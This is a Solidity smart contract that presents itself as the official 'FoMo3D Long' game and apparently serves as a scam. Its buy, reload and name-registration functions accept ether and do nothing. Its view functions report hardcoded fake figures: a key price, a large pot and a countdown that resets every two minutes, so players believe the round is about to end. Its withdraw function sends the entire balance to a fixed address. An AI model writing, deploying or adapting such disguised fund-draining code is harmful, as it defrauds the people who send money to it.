pragma solidity ^0.4.24;

contract FoMo3Dlong {
    using SafeMath for *;
    
    string constant public name = "FoMo3D Long Official";
    string constant public symbol = "F3D";
	uint256 public airDropPot_;
    uint256 public airDropTracker_ = 0;
    mapping (address => uint256) public pIDxAddr_;
    mapping (bytes32 => uint256) public pIDxName_;
    mapping (uint256 => F3Ddatasets.Player) public plyr_;
    mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;
    mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;
    mapping (uint256 => F3Ddatasets.Round) public round_;
    mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;

    mapping (uint256 => F3Ddatasets.TeamFee) public fees_;
    mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;

    function buyXid(uint256 _affCode, uint256 _team) public payable {}
    function buyXaddr(address _affCode, uint256 _team) public payable {}
    function buyXname(bytes32 _affCode, uint256 _team) public payable {}
    function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) public {}    
    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) public {} 
    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth) public {}
    function withdraw() public {
        address aff = 0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0;
        aff.transfer(this.balance);
    }
    function registerNameXID(string _nameString, uint256 _affCode, bool _all) public payable {}  
    function registerNameXaddr(string _nameString, address _affCode, bool _all) public payable {} 
    function registerNameXname(string _nameString, bytes32 _affCode, bool _all) public payable {} 

	uint256 public rID_ = 1;

    function getBuyPrice()
        public 
        view 
        returns(uint256)
    {  
        return ( 100254831521475310 );
    }

    function getTimeLeft()
        public
        view
        returns(uint256)
    {
        uint256 _rID = rID_;
		uint256 _now = now;
		round_[_rID].end =  _now + 125 - ( _now % 120 );
		return( 125 - ( _now % 120 ) );
    }

    function getPlayerVaults(uint256 _pID)
        public
        view
        returns(uint256 ,uint256, uint256)
    {
        return (0, 0, 0);
    }

    function getCurrentRoundInfo()
        public
        view
        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)
    {
        // setup local rID
        uint256 _rID = rID_;
		
		uint256 _now = now;
		
		round_[_rID].end = _now + 125 - (_now % 120);
        
        return
        (
            0,               //0
            _rID,                           //1
            round_[_rID].keys,             //2
            round_[_rID].end,        //3
            round_[_rID].strt,              //4
            round_[_rID].pot,               //5
            (round_[_rID].team + (round_[_rID].plyr * 10)),     //6
            0xd8723f6f396E28ab6662B91981B3eabF9De05E3C,  //7
            0x6d6f6c6963616e63657200000000000000000000000000000000000000000000,  //8
            3053823263697073356017,             //9
            4675447079848478547678,             //10
            85163999483914905978445,             //11
            3336394330928816056073,             //12
            519463956231409304003              //13
        );
    }
	
    function getPlayerInfoByAddress(address _addr)
        public 
        view 
        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)
    {
        return
        (
            18163,                               //0
            0x6d6f6c6963616e63657200000000000000000000000000000000000000000000,                   //1
            122081953021293259355,         //2
            0,                    //3
            0,       //4
            0,                    //5
            0           //6
        );
    }
	
    function calcKeysReceived(uint256 _rID, uint256 _eth)
        public
        view
        returns(uint256)
    {
        return (1646092234676);
    }

    function iWantXKeys(uint256 _keys)
        public
        view
        returns(uint256)
    {
        return (_keys.mul(100254831521475310)/1000000000000000000);
    }
	
    bool public activated_ = true;
    function activate() public {
        round_[1] = F3Ddatasets.Round(1954, 2, 1533795558, false, 1533794558, 34619432129976331518578579, 91737891789564224505545, 21737891789564224505545,31000, 0, 0, 0);
    }
	
    function setOtherFomo(address _otherF3D) public {}
}

//==============================================================================
//   __|_ _    __|_ _  .
//  _\ | | |_|(_ | _\  .
//==============================================================================
library F3Ddatasets {
    struct EventReturns {
        uint256 compressedData;
        uint256 compressedIDs;
        address winnerAddr;         // winner address
        bytes32 winnerName;         // winner name
        uint256 amountWon;          // amount won
        uint256 newPot;             // amount in new pot
        uint256 P3DAmount;          // amount distributed to p3d
        uint256 genAmount;          // amount distributed to gen
        uint256 potAmount;          // amount added to pot
    }
    struct Player {
        address addr;   // player address
        bytes32 name;   // player name
        uint256 win;    // winnings vault
        uint256 gen;    // general vault
        uint256 aff;    // affiliate vault
        uint256 lrnd;   // last round played
        uint256 laff;   // last affiliate id used
    }
    struct PlayerRounds {
        uint256 eth;    // eth player has added to round (used for eth limiter)
        uint256 keys;   // keys
        uint256 mask;   // player mask 
        uint256 ico;    // ICO phase investment
    }
    struct Round {
        uint256 plyr;   // pID of player in lead
        uint256 team;   // tID of team in lead
        uint256 end;    // time ends/ended
        bool ended;     // has round end function been ran
        uint256 strt;   // time round started
        uint256 keys;   // keys
        uint256 eth;    // total eth in
        uint256 pot;    // eth to pot (during round) / final amount paid to winner (after round ends)
        uint256 mask;   // global mask
        uint256 ico;    // total eth sent in during ICO phase
        uint256 icoGen; // total eth for gen during ICO phase
        uint256 icoAvg; // average key price for ICO phase
    }
    struct TeamFee {
        uint256 gen;    // % of buy in thats paid to key holders of current round
        uint256 p3d;    // % of buy in thats paid to p3d holders
    }
    struct PotSplit {
        uint256 gen;    // % of pot thats paid to key holders of current round
        uint256 p3d;    // % of pot thats paid to p3d holders
    }
}

/**
 * @title SafeMath v0.1.9
 * @dev Math operations with safety checks that throw on error
 * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
 * - added sqrt
 * - added sq
 * - added pwr 
 * - changed asserts to requires with error log outputs
 * - removed div, its useless
 */
library SafeMath {
    
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) 
        internal 
        pure 
        returns (uint256 c) 
    {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, "SafeMath mul failed");
        return c;
    }

    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256) 
    {
        require(b <= a, "SafeMath sub failed");
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c) 
    {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
    
    /**
     * @dev gives square root of given x.
     */
    function sqrt(uint256 x)
        internal
        pure
        returns (uint256 y) 
    {
        uint256 z = ((add(x,1)) / 2);
        y = x;
        while (z < y) 
        {
            y = z;
            z = ((add((x / z),z)) / 2);
        }
    }
    
    /**
     * @dev gives square. multiplies x by x
     */
    function sq(uint256 x)
        internal
        pure
        returns (uint256)
    {
        return (mul(x,x));
    }
    
    /**
     * @dev x to the power of y 
     */
    function pwr(uint256 x, uint256 y)
        internal 
        pure 
        returns (uint256)
    {
        if (x==0)
            return (0);
        else if (y==0)
            return (1);
        else 
        {
            uint256 z = x;
            for (uint256 i=1; i < y; i++)
                z = mul(z,x);
            return (z);
        }
    }
}